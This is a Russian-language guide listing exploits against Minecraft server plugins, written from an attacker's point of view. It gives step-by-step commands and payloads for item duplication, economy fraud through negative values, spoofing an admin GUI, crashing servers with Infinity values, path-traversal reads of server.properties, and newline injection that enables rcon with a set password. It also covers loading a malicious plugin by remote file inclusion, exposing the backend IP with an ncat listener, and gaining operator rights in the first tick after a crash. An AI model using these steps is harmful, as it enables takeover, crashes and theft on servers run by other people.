
                                                   Эксплойты, касающиеся всех плагинов.


Ники
1. Эксплойт Adprinting (Фича Essentials)
На сервере может быть возможность того, что ники игроков
сервер автоматически допечатывает (Такие как гриф FoxMine)
(Это можно проверить через /m и недопечатав ник тортика отправить команду)
И функционал плагина может не предусмотрен к этому.
Например, если игрок rick кикнется за читы плохим античитом
То кикнет и игрока ricky.
Либо если отправить запрос на низкий донат игроку torti
То донат выдастся на torti и на tortik

2. Эксплойт Letcase
Старые или плохо написаные плагины не могут найти разницу между
никами с разными регистрами. Например, между rick и Rick
Образец: На сервере при входе плагин проверяет баланс игрока
невзирая на регистр ника. И имея миллион рублей на аккаунте rick
Можно зайти с Rick, и там будет столько же. Можем перекинуть себе на основу.

3. Эксплойт Regex
Если зайти с нелегального никнейма, который содержит пробел и звёздочки по краям
Например: * Rick *
Это конфликтует с очень многими плагинами, например ChatEx, AAC, Matrix <7.4.8

Система GUI
1. Эксплойт FakeChest
Все плагины работают от разной структуры GUI
Уязвимая система может быть симитирована переименованым сундуком.
К примеру: Называется GUI "Mine Plugin" с алмазом по центру,
который переключает на админ меню.
И при переименовании сундука к "Mine Plugin" и клика на алмазик
лежащий в нём откроется админ меню.
Эксплойт утек вместе с Vulcan форс-опом.

2. Кик пакетами
Для эксплотации нужны моды для дюпа с гуишками (Содержатся в этом гитхабе)
Открываем меню, Нажимаем кнопку "Delay Packets". Выкидываем вешь.
Образуется пустая ячейка. Спамим ЛКМ автокликером по этому слоту.
После 6 секунд отключаем "Delay Packets" и автокликер.

Числа
1. Уязвимость с бесконечными числами
При вводе значения Infinity автоматически введется самое
большое возможное число. Которое потенциально может положить сервер.
Например: //pos1 Infinity разметит самый большой возможный регион
способный при любой операции положить сервер.

2. Уязвимость с отрицательными числами
Иногда плагин не предусматривает ввод отрицательных чисел.
Область применения:
/eco give tortik -10000
/clear rick diamond -10000

Чат
1. Символы
Символ % в нике префиксе или суффиксе ломает его, из-за этого чат ломается и начинаются приколы

Размещение или замещение блоков
1. Двойное замещение
Если плагин предоставляет возможность временно разместить любой блок / строение
То в такой системе есть неочевидный недочет. Постараюсь обьяснить попроще.
Если заместить блок два раза разными способами, в одних координатах, то в плагине произойдет
несостыковка. Блок, который заместился первым будет висеть в мире навсегда.
Образец использования: В плагине KitBattle присутсвует два разных набора, которые
умеют временно ставить строения. Если с кентом наложить эти два строения друг на друга
одновременно. То спустя пару секунд часть этих строений останется навсегда.

2. Перезагрузка сервера
Активируем способность плагина замещать блоки, и нужно, чтобы блоки не исчезли
До перезагрузки. После того, как сервер перезагрузится
Блоки останутся навсегда.
Образец использования: В плагине KitBattle если заспавнить временное строение
Которое будет висеть до перезагрузки, то после оно останется висеть навсегда.

3. Кривое замещение плагином
Если в области замещения кривого плагина окажется блок-хранилище
То при его действии содержимое блока-хранилища высыпится, а сам он
востановится после действия плагина.
Образец использования: Ложим в сундук ресурсы, которые хотим дюпнуть
Спавним трапку рядом с сундуком. Из него выпадут ресурсы.
После действия трапки сундук востановится с его первоначальным содержимым.
Демонстрация: https://www.youtube.com/watch?v=jGszljy0s3Y&t=83s

Файловый менеджер
1. LFI (LocalFileInclusion)
LocalFileInclusion - некоторые разработчики решили сделать команды
своего плагина взаимодействующими с системой файлов (HolographicDisplays, MultiverseCore, PlaceholderAPI, PlugmanX и так далее...),
не подозревая что она такая дырявая. В линуксо-подобных терминалах
предусмотрено, что этим синтаксисом можно залезть в любую директорию
К примеру: ../../server.properties
И судя по тому, какой вред это может нанести разрабами плагина
предусмотрено такое не было.

2. Чтение файлов не своего формата
Даже для меня было сюрпризом, что плагман хавает .yml файлы
Например, если указать ../../server.properties.yml для плагина,
который читает только yml, то он спокойно такое сожрет и пропарсит.

Вводные данные
1. Перенос на другую строку
По умолчанию чат майнкрафта не даст нам сделать перенос на следующую строчку.
При попытке нажать Enter команда просто выполнится. Но PlaceholderAPi готов
нам помочь. Загружая расширение Unicode и вводя %unicode_000% на выходе
сервер прочтет это как перенос на новую строку. Приведу пример.
Введя гыгы %unicode_000A%enable-rcon=true%unicode_000A%rcon.ip=127.0.0.1%unicode_000A%rcon.password=abubakr88%unicode_000A%rcon.port=32
Сервер увидит, как:
enable-rcon=true
rcon.ip=127.0.0.1
rcon.password=abubakr88
rcon.port=32

Выход в URL
1. RFI (RemoteFileInclusion)
RemoteFileInclusion - возможность подкачать любой файл в директорию,
если установленый плагин или расширение имеет возможность выходить в URL
стоит проверить возможность закачки контента на сервер. К примерам можно
отнести плагин PlugManX и расширение Fetch. Таким образом закачивали
вредоносное дополнение и активировали через LFI.

2. Pinger
Pinger - Получение прямого айпи основного сервера путем манипуляции.
Когда к тебе кто-то пытается подключиться или взаимодействовать через URL,
тебе дается его айпи. Делается это через плагины, склонные получать
информацию из любых URL. Приведу образец действий:
Пишем на дедике: ncat -lnvp порт который будем пинговать
(После этой команды откроется листенер, который будет писать
в консоль, если данный порт пинганут)
Пишем на сервере любую команду, пингующую наш дедик. В данном случае
она будет: /picture create https://0.0.0.0:1488
После ее выполнения в "удачном случае" в консоль
дедика напишет айпишник бекенда.

YAML-инъекция
1. Точка.
Точка - символ, переебывающий весь синтаксис YAML.
К примеру, arg1.arg2 YAML воспримет как
arg1:
  arg2

Ядро
1. Эксплойт первого и последнего тика
Как работает Bukkit с плагинами? Они загружаются или отгружаются постепенно.
После краша сервера или /stop есть один тик ванильного майнкрафта без плагинов.
чем мы можем пользоваться крашнув сервер и прописав в 1 тик /op Timings
позволяет обходить кривую защиту но к сожалению не работает на команды плагинов

или же аналогично первый тик после запуска сервера, когда запущены не все плагины.
заходим с нелегального ника на сервер 1.12.2 без прокси и AuthMe это схавает
